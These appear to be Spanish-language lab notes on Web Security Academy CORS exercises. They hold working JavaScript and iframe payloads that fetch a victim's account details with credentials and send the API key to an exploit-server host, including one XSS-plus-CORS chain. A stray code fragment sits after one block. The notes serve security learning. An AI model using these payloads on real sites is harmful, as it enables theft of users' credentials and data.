
## CORS vulnerability with basic origin reflection 

![Pasted image 20250910154505.png](img/Pasted_image_20250910154505.png)
## CORS vulnerability with trusted null origin 

Puede que cuando se manejen whitelist se tenga aceptado el `Origin: null`

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get', 'https://0a3c00b703c6749d816316ff00310028.web-security-academy.net/accountDetails', true); req.withCredentials = true; req.send(); function reqListener() { var data = JSON.parse(this.responseText); location='https://exploit-0a5500cf0386747c81d21513019d004a.exploit-server.net/exploit?apikey='+encodeURIComponent(data.apikey); }; </script>"></iframe>
```

## CORS vulnerability with trusted insecure protocols

Si un sitio permite en su configuración CORS en `Access-Control-Allow-Origin: http://nocifrado.com` 

Se puede interceptar el trafico para que cuando la victima visite (o forzar a que la victima visite) el dominio http, el atacante modifique la respuesta ya que viaja por http para que cuando el servidor http entregue la web al cliente el navegador del cliente ejecute el JavaScript malicioso. 

Se identifica que la aplicación permite un `Access-Control-Allow-Origin` para una aplicación que funciona en `http`
![Pasted image 20250910182413.png](img/Pasted_image_20250910182413.png)

Se identifico un subdominio que funciona por HTTP y que es vulnerable a XSS
![Pasted image 20250910182523.png](img/Pasted_image_20250910182523.png)
![Pasted image 20250910182553.png](img/Pasted_image_20250910182553.png)

Se entrego a la victima el siguiente payload
```html
<script>document.location = "http://stock.0a71003404e7df7580331ce100cc00c1.web-security-academy.net/?productId=1<script>fetch('https://0a71003404e7df7580331ce100cc00c1.web-security-academy.net/accountDetails', {credentials: 'include'}).then(r => r.json()).then(data => {const url = 'https://exploit-0a7a00740420dfef80fb1bc9017b0010.exploit-server.net/exploit?apikey='%2bencodeURIComponent(data.apikey); fetch(url)});%3c/script>&storeId=2"</script>
``` -replace " ", "_"
    )

Payload
```html
<script> 
    fetch("https://0a6500c1044e32cb812d0c9e00400029.web-security-academy.net/accountDetails", {
        credentials: "include"
        })
    .then(res => res.json()) 
    .then(data => {
        const url = "https://exploit-0a9500c0046832f081030b4701890058.exploit-server.net/exploit?apikey=" + encodeURIComponent(data.apikey);  
        fetch(url); 
    }); 
</script> 
```
